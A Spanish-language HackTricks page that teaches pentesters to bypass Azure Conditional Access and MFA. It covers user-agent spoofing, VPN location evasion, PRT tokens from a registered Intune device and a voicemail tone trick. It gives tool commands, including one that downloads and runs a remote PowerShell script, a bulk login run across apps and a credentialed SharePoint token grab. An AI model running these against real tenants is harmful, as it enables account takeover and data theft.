# Az - Pol√≠ticas de Acceso Condicional y Bypass de MFA

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.

</details>
{% endhint %}

## Informaci√≥n B√°sica

Las pol√≠ticas de acceso condicional de Azure son reglas establecidas en Microsoft Azure para hacer cumplir controles de acceso a servicios y aplicaciones de Azure basados en ciertas **condiciones**. Estas pol√≠ticas ayudan a las organizaciones a asegurar sus recursos aplicando los controles de acceso correctos bajo las circunstancias adecuadas.\
Las pol√≠ticas de acceso condicional **definen** **Qui√©n** puede acceder a **Qu√©** desde **D√≥nde** y **C√≥mo**.

Aqu√≠ hay un par de ejemplos:

1. **Pol√≠tica de Riesgo de Inicio de Sesi√≥n**: Esta pol√≠tica podr√≠a configurarse para requerir autenticaci√≥n multifactor (MFA) cuando se detecta un riesgo de inicio de sesi√≥n. Por ejemplo, si el comportamiento de inicio de sesi√≥n de un usuario es inusual en comparaci√≥n con su patr√≥n regular, como iniciar sesi√≥n desde un pa√≠s diferente, el sistema puede solicitar autenticaci√≥n adicional.
2. **Pol√≠tica de Cumplimiento de Dispositivos**: Esta pol√≠tica puede restringir el acceso a los servicios de Azure solo a dispositivos que cumplan con los est√°ndares de seguridad de la organizaci√≥n. Por ejemplo, el acceso podr√≠a permitirse solo desde dispositivos que tengan software antivirus actualizado o que est√©n ejecutando una versi√≥n espec√≠fica del sistema operativo.

## Bypasses de Pol√≠ticas de Acceso Condicional

Es posible que una pol√≠tica de acceso condicional est√© **verificando informaci√≥n que puede ser f√°cilmente manipulada, permitiendo un bypass de la pol√≠tica**. Y si, por ejemplo, la pol√≠tica estaba configurando MFA, el atacante podr√° eludirla.

Al configurar una pol√≠tica de acceso condicional, es necesario indicar los **usuarios** afectados y los **recursos objetivo** (como todas las aplicaciones en la nube).

Tambi√©n es necesario configurar las **condiciones** que **activar√°n** la pol√≠tica:

* **Red**: IP, rangos de IP y ubicaciones geogr√°ficas
* Puede ser eludida usando una VPN o Proxy para conectarse a un pa√≠s o logrando iniciar sesi√≥n desde una direcci√≥n IP permitida
* **Riesgos de Microsoft**: Riesgo del usuario, riesgo de inicio de sesi√≥n, riesgo interno
* **Plataformas de dispositivos**: Cualquier dispositivo o seleccionar Android, iOS, Windows phone, Windows, macOS, Linux
* Si ‚ÄúCualquier dispositivo‚Äù no est√° seleccionado pero todas las otras opciones est√°n seleccionadas, es posible eludirlo usando un user-agent aleatorio no relacionado con esas plataformas
* **Aplicaciones cliente**: Las opciones son ‚ÄúNavegador‚Äù, ‚ÄúAplicaciones m√≥viles y clientes de escritorio‚Äù, ‚ÄúClientes de Exchange ActiveSync‚Äù y ‚ÄúOtros clientes‚Äù
* Para eludir el inicio de sesi√≥n con una opci√≥n no seleccionada
* **Filtro para dispositivos**: Es posible generar una regla relacionada con el dispositivo utilizado
* **Flujos de autenticaci√≥n**: Las opciones son ‚ÄúFlujo de c√≥digo de dispositivo‚Äù y ‚ÄúTransferencia de autenticaci√≥n‚Äù
* Esto no afectar√° a un atacante a menos que est√© tratando de abusar de alguno de esos protocolos en un intento de phishing para acceder a la cuenta de la v√≠ctima

Los posibles **resultados** son: Bloquear o Conceder acceso con condiciones potenciales como requerir MFA, que el dispositivo sea conforme‚Ä¶

### Plataformas de Dispositivos - Condici√≥n de Dispositivo

Es posible establecer una condici√≥n basada en la **plataforma del dispositivo** (Android, iOS, Windows, macOS...), sin embargo, esto se basa en el **user-agent** por lo que es f√°cil de eludir. Incluso **haciendo que todas las opciones exijan MFA**, si usas un **user-agent que no es reconocido,** podr√°s eludir el MFA o el bloqueo:

<figure><img src="../../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

Simplemente haciendo que el navegador **env√≠e un user-agent desconocido** (como `Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920) UCBrowser/10.1.0.563 Mobile`) es suficiente para no activar esta condici√≥n.\
Puedes cambiar el user agent **manualmente** en las herramientas de desarrollo:

<figure><img src="../../../.gitbook/assets/image (351).png" alt="" width="375"><figcaption></figcaption></figure>

&#x20;O usar una [extensi√≥n de navegador como esta](https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg?hl=en).

### Ubicaciones: Pa√≠ses, rangos de IP - Condici√≥n de Dispositivo

Si esto est√° configurado en la pol√≠tica condicional, un atacante podr√≠a simplemente usar una **VPN** en el **pa√≠s permitido** o intentar encontrar una manera de acceder desde una **direcci√≥n IP permitida** para eludir estas condiciones.

### Aplicaciones en la Nube

Es posible configurar **pol√≠ticas de acceso condicional para bloquear o forzar**, por ejemplo, MFA cuando un usuario intenta acceder a una **aplicaci√≥n espec√≠fica**:

<figure><img src="../../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

Para intentar eludir esta protecci√≥n, deber√≠as ver si puedes **iniciar sesi√≥n solo en cualquier aplicaci√≥n**.\
La herramienta [**AzureAppsSweep**](https://github.com/carlospolop/AzureAppsSweep) tiene **decenas de IDs de aplicaci√≥n codificados** y tratar√° de iniciar sesi√≥n en ellas y te informar√° e incluso te dar√° el token si tiene √©xito.

Para **probar IDs de aplicaci√≥n espec√≠ficos en recursos espec√≠ficos**, tambi√©n podr√≠as usar una herramienta como:

{% code overflow="wrap" %}
```bash
roadrecon auth -u user@email.com -r https://outlook.office.com/ -c 1fec8e78-bce4-4aaf-ab1b-5451cc387264 --tokens-stdout

<token>
```
{% endcode %}

Adem√°s, tambi√©n es posible proteger el m√©todo de inicio de sesi√≥n (por ejemplo, si est√°s intentando iniciar sesi√≥n desde el navegador o desde una aplicaci√≥n de escritorio). La herramienta [**Invoke-MFASweep**](az-conditional-access-policies-mfa-bypass.md#invoke-mfasweep) realiza algunas verificaciones para intentar eludir estas protecciones tambi√©n.

La herramienta [**donkeytoken**](az-conditional-access-policies-mfa-bypass.md#donkeytoken) tambi√©n podr√≠a usarse para prop√≥sitos similares, aunque parece no estar mantenida.

La herramienta [**ROPCI**](https://github.com/wunderwuzzi23/ropci) tambi√©n se puede usar para probar estas protecciones y ver si es posible eludir los MFA o bloqueos, pero esta herramienta funciona desde una perspectiva de **caja blanca**. Primero necesitas descargar la lista de aplicaciones permitidas en el inquilino y luego intentar√° iniciar sesi√≥n en ellas.

## Otras elusiones de Az MFA

### Tono de llamada

Una opci√≥n de Azure MFA es **recibir una llamada en el n√∫mero de tel√©fono configurado** donde se le pedir√° al usuario que **env√≠e el car√°cter `#`**.

{% hint style="danger" %}
Como los caracteres son solo **tonos**, un atacante podr√≠a **comprometer** el mensaje de **buz√≥n de voz** del n√∫mero de tel√©fono, configurar como mensaje el **tono de `#`** y luego, al solicitar el MFA, asegurarse de que el **tel√©fono de la v√≠ctima est√© ocupado** (llam√°ndolo) para que la llamada de Azure se redirija al buz√≥n de voz.
{% endhint %}

### Dispositivos compatibles

Las pol√≠ticas a menudo requieren un dispositivo compatible o MFA, por lo que un **atacante podr√≠a registrar un dispositivo compatible**, obtener un **token PRT** y **eludir de esta manera el MFA**.

Comienza registrando un **dispositivo compatible en Intune**, luego **obt√©n el PRT** con:
```powershell
$prtKeys = Get-AADIntuneUserPRTKeys - PfxFileName .\<uuid>.pfx -Credentials $credentials

$prtToken = New-AADIntUserPRTToken -Settings $prtKeys -GertNonce

Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken

<token returned>
```
Encuentra m√°s informaci√≥n sobre este tipo de ataque en la siguiente p√°gina:

{% content-ref url="../az-lateral-movement-cloud-on-prem/pass-the-prt.md" %}
[pass-the-prt.md](../az-lateral-movement-cloud-on-prem/pass-the-prt.md)
{% endcontent-ref %}

## Herramientas

### [**AzureAppsSweep**](https://github.com/carlospolop/AzureAppsSweep)

Este script obtiene algunas credenciales de usuario y verifica si puede iniciar sesi√≥n en algunas aplicaciones.

Esto es √∫til para ver si **no se requiere MFA para iniciar sesi√≥n en algunas aplicaciones** que podr√≠as abusar m√°s tarde para **escalar privilegios**.

### [roadrecon](https://github.com/dirkjanm/ROADtools)

Obt√©n todas las pol√≠ticas.
```bash
roadrecon plugin policies
```
### [Invoke-MFASweep](https://github.com/dafthack/MFASweep)

MFASweep es un script de PowerShell que intenta **iniciar sesi√≥n en varios servicios de Microsoft utilizando un conjunto de credenciales proporcionado y tratar√° de identificar si MFA est√° habilitado**. Dependiendo de c√≥mo se configuren las pol√≠ticas de acceso condicional y otros ajustes de autenticaci√≥n multifactor, algunos protocolos pueden terminar siendo de un solo factor. Tambi√©n tiene una verificaci√≥n adicional para configuraciones de ADFS y puede intentar iniciar sesi√≥n en el servidor ADFS local si se detecta.
```bash
Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1").Content
Invoke-MFASweep -Username <username> -Password <pass>
```
### [ROPCI](https://github.com/wunderwuzzi23/ropci)

Esta herramienta ha ayudado a identificar las elusiones de MFA y luego abusar de las APIs en m√∫ltiples inquilinos de AAD en producci√≥n, donde los clientes de AAD cre√≠an que ten√≠an MFA aplicado, pero la autenticaci√≥n basada en ROPC tuvo √©xito.

{% hint style="success" %}
Necesitas tener permisos para listar todas las aplicaciones para poder generar la lista de las aplicaciones a las que hacer fuerza bruta.
{% endhint %}
```bash
./ropci configure
./ropci apps list --all --format json -o apps.json
./ropci apps list --all --format json | jq -r '.value[] | [.displayName,.appId] | @csv' > apps.csv
./ropci auth bulk -i apps.csv -o results.json
```
### [donkeytoken](https://github.com/silverhack/donkeytoken)

Donkey token es un conjunto de funciones que tienen como objetivo ayudar a los consultores de seguridad que necesitan validar las Pol√≠ticas de Acceso Condicional, pruebas para portales de Microsoft habilitados para 2FA, etc.

<pre class="language-powershell"><code class="lang-powershell"><strong>git clone https://github.com/silverhack/donkeytoken.git
</strong><strong>Import-Module '.\donkeytoken' -Force
</strong></code></pre>

**Prueba cada portal** si es posible **iniciar sesi√≥n sin MFA**:
```powershell
$username = "conditional-access-app-user@azure.training.hacktricks.xyz"
$password = ConvertTo-SecureString "Poehurgi78633" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
Invoke-MFATest -credential $cred -Verbose -Debug -InformationAction Continue
```
Porque el **portal** de **Azure** **no est√° restringido**, es posible **recolectar un token del endpoint del portal para acceder a cualquier servicio detectado** por la ejecuci√≥n anterior. En este caso, se identific√≥ Sharepoint, y se solicita un token para acceder a √©l:

{% code overflow="wrap" %}
```powershell
$token = Get-DelegationTokenFromAzurePortal -credential $cred -token_type microsoft.graph -extension_type Microsoft_Intune
Read-JWTtoken -token $token.access_token
```
{% endcode %}

Suponiendo que el token tiene el permiso Sites.Read.All (de Sharepoint), incluso si no puedes acceder a Sharepoint desde la web debido a MFA, es posible usar el token para acceder a los archivos con el token generado:
```powershell
$data = Get-SharePointFilesFromGraph -authentication $token $data[0].downloadUrl
```
## Referencias

* [https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s](https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.

</details>
{% endhint %}
